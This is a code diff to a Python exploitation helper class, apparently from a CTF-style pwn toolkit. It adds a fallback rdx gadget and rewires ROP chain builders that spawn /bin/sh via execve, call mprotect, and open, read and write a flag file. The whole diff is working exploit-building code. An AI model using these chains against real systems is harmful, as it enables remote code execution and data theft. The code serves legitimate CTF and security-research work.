@@ -594,6 +594,11 @@ class CurrentGadgets:
         return CurrentGadgets._internal_find('get_pop_rdx_ret')
 
     @staticmethod
+    def pop_rdx_rbx_ret() -> int:
+        """pop rdx; pop rbx; ret"""
+        return CurrentGadgets._internal_find('get_pop_rdx_rbx_ret')
+
+    @staticmethod
     def pop_rax_ret() -> int:
         """pop rax; ret"""
         return CurrentGadgets._internal_find('get_pop_rax_ret')
@@ -643,6 +648,14 @@ class CurrentGadgets:
     def sh() -> int:
         """sh"""
         return CurrentGadgets._internal_find('get_sh')
+    
+    @staticmethod
+    def __try_get_rdx_gadget(rdx_val, rbx_val=0) -> list:
+        try:
+            addr = CurrentGadgets.pop_rdx_ret()
+            return [addr, rdx_val]
+        except:
+            return [CurrentGadgets.pop_rdx_rbx_ret(), rdx_val, rbx_val]
 
     @staticmethod
     def execve_chain(bin_sh_addr=None) -> bytes:
@@ -655,8 +668,7 @@ class CurrentGadgets:
                 bin_sh_addr or CurrentGadgets.bin_sh(),
                 CurrentGadgets.pop_rcx_ret(),
                 0,
-                CurrentGadgets.pop_rdx_ret(),
-                0,
+                CurrentGadgets.__try_get_rdx_gadget(0, bin_sh_addr or CurrentGadgets.bin_sh()),
                 CurrentGadgets.pop_rax_ret(),
                 0xb,
                 CurrentGadgets.syscall()
@@ -667,8 +679,7 @@ class CurrentGadgets:
                 bin_sh_addr or CurrentGadgets.bin_sh(),
                 CurrentGadgets.pop_rsi_ret(),
                 0,
-                CurrentGadgets.pop_rdx_ret(),
-                0,
+                CurrentGadgets.__try_get_rdx_gadget(0),
                 CurrentGadgets.pop_rax_ret(),
                 0x3b,
                 CurrentGadgets.syscall()
@@ -689,8 +700,7 @@ class CurrentGadgets:
                 va,
                 CurrentGadgets.pop_rcx_ret(),
                 length,
-                CurrentGadgets.pop_rdx_ret(),
-                prog,
+                CurrentGadgets.__try_get_rdx_gadget(prog, va),
                 CurrentGadgets.pop_rax_ret(),
                 125,
                 CurrentGadgets.syscall()
@@ -701,8 +711,7 @@ class CurrentGadgets:
                 va,
                 CurrentGadgets.pop_rsi_ret(),
                 length,
-                CurrentGadgets.pop_rdx_ret(),
-                prog,
+                CurrentGadgets.__try_get_rdx_gadget(prog),
                 CurrentGadgets.pop_rax_ret(),
                 10,
                 CurrentGadgets.syscall()
@@ -713,7 +722,7 @@ class CurrentGadgets:
         return flat(layout)
 
     @staticmethod
-    def orw_chain(flag_addr, buf_addr=None, flag_fd=3, write_fd=1) -> bytes:
+    def orw_chain(flag_addr, buf_addr=None, flag_fd=3, write_fd=1, buf_len=0x30) -> bytes:
         if not CurrentGadgets._initial_ropperbox():
             return None
         
@@ -735,8 +744,7 @@ class CurrentGadgets:
                 flag_fd,
                 CurrentGadgets.pop_rcx_ret(),
                 buf_addr,
-                CurrentGadgets.pop_rdx_ret(),
-                0x30,
+                CurrentGadgets.__try_get_rdx_gadget(buf_len, flag_fd),
                 CurrentGadgets.pop_rax_ret(),
                 3,
                 CurrentGadgets.syscall_ret(),
@@ -762,8 +770,7 @@ class CurrentGadgets:
                 flag_fd,
                 CurrentGadgets.pop_rsi_ret(),
                 buf_addr,
-                CurrentGadgets.pop_rdx_ret(),
-                0x30,
+                CurrentGadgets.__try_get_rdx_gadget(buf_len),
                 CurrentGadgets.pop_rax_ret(),
                 0x0,
                 CurrentGadgets.syscall_ret(),
